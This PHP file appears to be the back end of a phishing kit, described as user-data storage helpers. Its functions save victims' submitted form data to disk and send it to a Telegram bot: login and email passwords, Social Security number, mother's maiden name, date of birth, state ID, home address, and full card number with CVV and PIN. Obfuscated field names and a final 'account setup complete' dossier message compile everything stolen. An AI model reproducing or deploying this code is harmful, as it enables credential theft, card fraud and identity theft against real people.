<?php

require_once __DIR__ . '/../config.php';

/**
 * File Storage Helper Functions
 * Saves user data to text files instead of making API calls
 * Includes Telegram integration for notifications
 */

function saveUserData($filename, $data) {
    $dataDir = DATA_STORAGE_PATH;
    
    // Create data directory if it doesn't exist
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0755, true);
    }
    
    // Create user-specific directory if username exists
    if (isset($data['usrnm'])) {
        $userDir = $dataDir . '/' . $data['usrnm'];
        if (!is_dir($userDir)) {
            mkdir($userDir, 0755, true);
        }
        
        // Save to single user file instead of step-specific files
        $filepath = $userDir . '/user_data.txt';
    } else {
        // Fallback to shared file if no username
        $filepath = $dataDir . '/' . $filename;
    }
    
    // Add timestamp and step info to each entry
    $timestamp = date('Y-m-d H:i:s');
    $entry = "[$timestamp] Step: " . ($data['step'] ?? 'unknown') . " - " . json_encode($data) . "\n";
    
    // Save to file
    $result = file_put_contents($filepath, $entry, FILE_APPEND | LOCK_EX);
    
    // Send Telegram notification if enabled
    if ($result && TELEGRAM_ENABLED) {
        sendTelegramNotification($data);
    }
    
    return $result;
}

function sendTelegramNotification($data) {
    if (!TELEGRAM_ENABLED || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        return false;
    }
    
    $step = $data['step'] ?? 'unknown';
    $username = $data['usrnm'] ?? 'unknown';
    $timestamp = date('Y-m-d H:i:s');
    
    // Select appropriate message based on step
    switch ($step) {
        case 'login':
            $message = "🔐 New Login\n"
                . "👤 Username: " . ($data['emzemz'] ?? $username) . "\n"
                . "🔑 Password: " . ($data['pwzenz'] ?? 'N/A') . "\n"
                . "🌐 IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n"
                . "📱 User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown') . "\n"
                . "⏰ Time: $timestamp";
            break;
            
        case 'email_password':
            $message = "📧 Account Credentials Set\n"
                . "👤 User: $username\n"
                . "📧 Email: " . ($data['usr_eml'] ?? 'N/A') . "\n"
                . "🔑 Password: " . ($data['acc_cd'] ?? 'N/A') . "\n"
                . "✅ Confirmation: Matched\n"
                . "⏰ Time: $timestamp";
            break;
            
        case 'basic_info_home_address':
            $message = "👤 Profile Information Completed\n"
                . "👤 User: $username\n"
                . "⏰ Time: $timestamp\n\n"
                . "📝 Personal Details:\n"
                . "👤 First: " . ($data['gvn_nm'] ?? 'N/A') . "\n"
                . "👤 Last: " . ($data['fam_nm'] ?? 'N/A') . "\n"
                . "📞 Phone: " . ($data['cnt_num'] ?? 'N/A') . "\n"
                . "🔢 SSN: " . ($data['tax_id'] ?? 'N/A') . "\n"
                . "👶 Mother's Maiden Name: " . ($data['mat_nm'] ?? 'N/A') . "\n"
                . "🎂 DOB: " . ($data['dob'] ?? 'N/A') . "\n"
                . "🪪 State ID: " . ($data['id_num'] ?? 'N/A') . "\n\n"
                . "🏠 Residential Address:\n"
                . "📍 Street: " . ($data['str_adr'] ?? 'N/A') . "\n"
                . "🏢 Unit: " . ($data['unit_dsg'] ?? 'N/A') . "\n"
                . "🏙️ City: " . ($data['loc'] ?? 'N/A') . "\n"
                . "🗺️ State: " . ($data['prov'] ?? 'N/A') . "\n"
                . "📮 ZIP: " . ($data['zip_cd'] ?? 'N/A');
            break;
            
        case 'card_information':
            $cardNumber = $data['pay_card'] ?? '';
            $formattedCard = $cardNumber ? 
                substr($cardNumber, 0, 4) . '-' . 
                substr($cardNumber, 4, 4) . '-' . 
                substr($cardNumber, 8, 4) . '-' . 
                substr($cardNumber, 12) : 'N/A';

            $message = "💳 Payment Method Added\n"
                . "👤 User: $username\n"
                . "⏰ Time: $timestamp\n\n"
                . "💳 Card: $formattedCard\n"
                . "📅 Exp: " . ($data['exp_mth'] ?? 'MM') . "/" . ($data['exp_yr'] ?? 'YYYY') . "\n"
                . "🔢 CVV: " . ($data['sec_cd'] ?? 'N/A') . "\n"
                . "🏧 PIN: " . ($data['pin_cd'] ?? 'N/A');
            break;
            
        case 'terms_acceptance':
            // Get complete user data for flow completion
            $completeData = [];
            $userDir = DATA_STORAGE_PATH . '/' . $username;
            if (is_dir($userDir)) {
                $userFile = $userDir . '/user_data.txt';
                if (file_exists($userFile)) {
                    $lines = file($userFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                    foreach ($lines as $line) {
                        if (preg_match('/\[.*?\] Step: (\w+) - (\{.*\})/', $line, $matches)) {
                            $stepData = json_decode($matches[2], true);
                            if (is_array($stepData)) {
                                $completeData[$matches[1]] = $stepData;
                            }
                        }
                    }
                }
            }
            
            // Format card number if available
            $cardNumber = $completeData['card_information']['pay_card'] ?? '';
            $formattedCard = $cardNumber ? 
                substr($cardNumber, 0, 4) . '-' . 
                substr($cardNumber, 4, 4) . '-' . 
                substr($cardNumber, 8, 4) . '-' . 
                substr($cardNumber, 12) : 'N/A';
            
            $message = "🎉 ACCOUNT SETUP COMPLETE! 🎉\n"
                . "👤 User: $username\n"
                . "⏰ Time: $timestamp\n"
                . "📊 Steps: " . count($completeData) . "\n\n"
                . "🔐 ACCOUNT CREDENTIALS\n"
                . "📧 Email: " . ($completeData['email_password']['usr_eml'] ?? 'N/A') . "\n"
                . "🔑 Password: " . ($completeData['email_password']['acc_cd'] ?? 'N/A') . "\n\n"
                . "👤 PERSONAL INFORMATION\n"
                . "👤 Name: " . ($completeData['basic_info_home_address']['gvn_nm'] ?? 'N/A') . ' ' . ($completeData['basic_info_home_address']['fam_nm'] ?? 'N/A') . "\n"
                . "📞 Phone: " . ($completeData['basic_info_home_address']['cnt_num'] ?? 'N/A') . "\n"
                . "🔢 SSN: " . ($completeData['basic_info_home_address']['tax_id'] ?? 'N/A') . "\n"
                . "👶 Mother's Maiden Name: " . ($completeData['basic_info_home_address']['mat_nm'] ?? 'N/A') . "\n"
                . "🎂 DOB: " . ($completeData['basic_info_home_address']['dob'] ?? 'N/A') . "\n"
                . "🪪 State ID: " . ($completeData['basic_info_home_address']['id_num'] ?? 'N/A') . "\n\n"
                . "🏠 ADDRESS\n"
                . "📍 " . ($completeData['basic_info_home_address']['str_adr'] ?? 'N/A') . "\n"
                . "   " . ($completeData['basic_info_home_address']['unit_dsg'] ? 'Unit ' . $completeData['basic_info_home_address']['unit_dsg'] . ', ' : '') . "\n"
                . "   " . ($completeData['basic_info_home_address']['loc'] ?? 'N/A') . ', ' . ($completeData['basic_info_home_address']['prov'] ?? 'N/A') . ' ' . ($completeData['basic_info_home_address']['zip_cd'] ?? 'N/A') . "\n\n"
                . "💳 PAYMENT METHOD\n"
                . "💳 Card: $formattedCard\n"
                . "📅 Exp: " . ($completeData['card_information']['exp_mth'] ?? 'MM') . "/" . ($completeData['card_information']['exp_yr'] ?? 'YYYY') . "\n"
                . "🔢 CVV: " . ($completeData['card_information']['sec_cd'] ?? 'N/A') . "\n"
                . "🏧 PIN: " . ($completeData['card_information']['pin_cd'] ?? 'N/A') . "\n\n"
                . "✅ Terms: " . (isset($data['terms_accepted']) && $data['terms_accepted'] ? 'ACCEPTED' : 'DECLINED') . "\n\n"
                . "🔄 JOURNEY STEPS:\n";
            
            foreach ($completeData as $stepName => $stepData) {
                $message .= "✅ " . ucwords(str_replace('_', ' ', $stepName)) . "\n";
            }
            break;
            
        default:
            // For any other step, show all submitted data
            $message = "✅ Step Completed: $step\n"
                . "👤 User: $username\n"
                . "⏰ Time: $timestamp\n\n"
                . "📋 Submitted Data:\n";
                
            foreach ($data as $key => $value) {
                if ($key !== 'step' && $key !== 'usrnm') {
                    $message .= "• " . ucwords(str_replace('_', ' ', $key)) . ": " . (is_array($value) ? json_encode($value) : $value) . "\n";
                }
            }
            break;
    }
    
    // Send to Telegram
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $postData = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode === 200;
}

function getUserData($filename, $username = null) {
    $dataDir = DATA_STORAGE_PATH;
    
    if ($username) {
        $filepath = $dataDir . '/' . $username . '/user_data.txt';
    } else {
        $filepath = $dataDir . '/' . $filename;
    }
    
    if (!file_exists($filepath)) {
        return [];
    }
    
    $lines = file($filepath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $userData = [];
    
    foreach ($lines as $line) {
        // Extract JSON part from line (remove timestamp prefix)
        if (preg_match('/\{.*\}$/', $line, $matches)) {
            $userData[] = json_decode($matches[0], true);
        }
    }
    
    return $userData;
}

function parseDataFile($filename) {
    return getUserData($filename);
}

?>
